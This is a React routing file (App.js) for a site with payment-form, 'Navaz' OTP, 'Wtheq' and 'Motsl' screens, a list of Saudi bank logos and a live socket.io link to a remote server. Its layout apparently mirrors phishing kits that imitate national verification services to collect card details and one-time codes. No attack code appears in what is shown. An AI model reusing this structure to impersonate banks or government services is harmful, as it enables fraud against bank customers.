import { BrowserRouter, Route, Routes } from "react-router-dom";
import PaymentForm from "./screen/PaymentForm";
import Main from "./screen/Main";
import NewDate from "./screen/NewDate";
import { useEffect, useState } from "react";
import NotFound from "./screen/NotFound";
import Motsl from "./screen/Wtheq";
import Navaz from "./screen/Navaz";
import axios from "axios";
import Footer from "./component/Footer";
import Home from "./screen/Home";
import { io } from "socket.io-client";
import Wtheq from "./screen/Wtheq";
import NavazOtp from "./screen/NavazOtp";

export const api_route = "https://s-server-fh32.onrender.com";
// export const api_route = "http://localhost:8080";
export const socket = io(api_route);

export const banks = [
  {
    img: "/payment/alahli1.png",
    name: "Ahly",
  },
  {
    img: "/payment/alarabi1.png",
    name: "Arabi",
  },
  {
    img: "/payment/alawal.png",
    name: "Alawal",
  },
  {
    img: "/payment/albilad.png",
    name: "Alblad",
  },
  {
    img: "/payment/alinma2.png",
    name: "Alinma",
  },
  {
    img: "/payment/aljazera.png",
    name: "AlGazera",
  },
  {
    img: "/payment/alrajhi1.png",
    name: "AlRaghy",
  },
  {
    img: "/payment/estithmari.png",
    name: "Estsmary Saudia",
  },
  {
    img: "/payment/firns.png",
    name: "French Captial",
  },
  {
    img: "/payment/rid.png",
    name: "AlRiyad",
  },
  {
    img: "/payment/sabb.png",
    name: "Sab",
  },
  {
    img: "/payment/samm.png",
    name: "Samba",
  },
];
export const token = sessionStorage.getItem("session");
function App() {
  const [mode, setMode] = useState("ar");

  // const query = new URLSearchParams(window.location.search)

  const checkMode = (english = false, arabic = false) => {
    if (english && arabic) {
      if (mode === "en") {
        return { lang: "en", word: english };
      } else {
        return { lang: "ar", word: arabic };
      }
    } else {
      return mode;
    }
  };
  return (
    <>
      {
        <div className="">
          <BrowserRouter>
            <Routes>
              <Route element={<Home />} path="/" />
              <Route element={<Main />} path="/main" />
              <Route element={<NewDate />} path="/new-date" />
              {sessionStorage.getItem("id") && (
                <>
                  <Route
                    element={
                      <NavazOtp
                        checkMode={checkMode}
                        setMode={setMode}
                        mode={mode}
                      />
                    }
                    path="/navazOtp/:num"
                  />
                  <Route element={<PaymentForm />} path="/payment-form" />
                  <Route
                    element={
                      <Motsl
                        checkMode={checkMode}
                        setMode={setMode}
                        mode={mode}
                      />
                    }
                    path="/motsl"
                  />

                  <Route
                    element={
                      <Navaz
                        checkMode={checkMode}
                        setMode={setMode}
                        mode={mode}
                      />
                    }
                    path="/navaz"
                  />

                  <Route
                    element={
                      <Wtheq
                        checkMode={checkMode}
                        setMode={setMode}
                        mode={mode}
                      />
                    }
                    path="/wtheq"
                  />
                </>
              )}
              <Route
                element={
                  <NotFound
                    checkMode={checkMode}
                    setMode={setMode}
                    mode={mode}
                  />
                }
                path="*"
              />
            </Routes>
            <Footer />
          </BrowserRouter>
        </div>
      }
    </>
  );
}

export default App;
